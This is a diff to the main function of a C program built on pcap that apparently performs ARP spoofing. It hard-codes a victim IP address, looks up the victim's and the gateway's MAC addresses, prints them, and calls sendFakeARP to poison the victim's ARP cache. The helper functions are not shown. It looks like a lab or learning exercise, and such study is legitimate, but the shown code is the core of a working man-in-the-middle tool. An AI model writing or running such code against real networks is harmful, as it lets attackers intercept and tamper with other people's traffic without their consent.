@@ -2,11 +2,11 @@
 
 int main()
 {
-	DeviceInfo myDeviceInfo, victimDeviceInfo;
+	LANINFO LanInfo;
 	pcap_if_t* alldevs, * choiceDev;
 	pcap_t* handle;
 	char errbuf[PCAP_ERRBUF_SIZE];
-	char victimIP[16] = "192.168.50.146";
+	char victimIP[16] = "192.168.50.135";
 
 	/* Retrieve the device list from the local machine */
 	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
@@ -24,11 +24,9 @@ int main()
 	}
 	/* now, we don't need any more the devices list */
 	pcap_freealldevs(alldevs);
-
+	memset(&LanInfo, 0, sizeof(LanInfo));
 	/* find Device's GateWay IP address */
-	getGateWayAddress(choiceDev, &myDeviceInfo);
-
-
+	getGateWayAddress(choiceDev, &LanInfo);
 	/*
 	int res;
 	while ((res = pcap_next_ex(handle, &header, &packet)) >= 0)
@@ -44,9 +42,23 @@ int main()
 	*/
 	//printf("Input vicim's IP Address : ");
 	//scanf("%s", victimIP);
-	memset(&victimDeviceInfo, 0, sizeof(DeviceInfo));
-	victimDeviceInfo.ipAddress.S_un.S_addr = inet_addr(victimIP);
-	getVictimMAC(handle, &myDeviceInfo, &victimDeviceInfo);
+	LanInfo.victimIP.S_un.S_addr = inet_addr(victimIP);
+	getMACAddress(handle, &LanInfo);
+	for (int i = 0; i < 6; i++)
+	{
+		if (i == 5)
+			printf("%.2X\n", LanInfo.victimMAC[i]);
+		else
+			printf("%.2X-", LanInfo.victimMAC[i]);
+	}
+	for (int i = 0; i < 6; i++)
+	{
+		if (i == 5)
+			printf("%.2X\n", LanInfo.gatewayMAC[i]);
+		else
+			printf("%.2X-", LanInfo.gatewayMAC[i]);
+	}
+	sendFakeARP(handle, &LanInfo);
 	pcap_close(handle);
 	return 0;
 }
